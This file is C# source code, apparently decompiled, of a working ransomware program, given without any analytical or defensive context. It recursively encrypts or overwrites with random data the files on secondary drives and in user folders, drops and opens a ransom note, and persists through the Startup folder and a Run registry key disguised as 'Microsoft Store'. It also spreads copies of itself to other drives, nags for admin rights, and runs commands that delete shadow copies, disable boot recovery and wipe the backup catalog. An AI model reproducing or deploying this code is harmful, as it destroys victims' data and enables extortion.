
	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
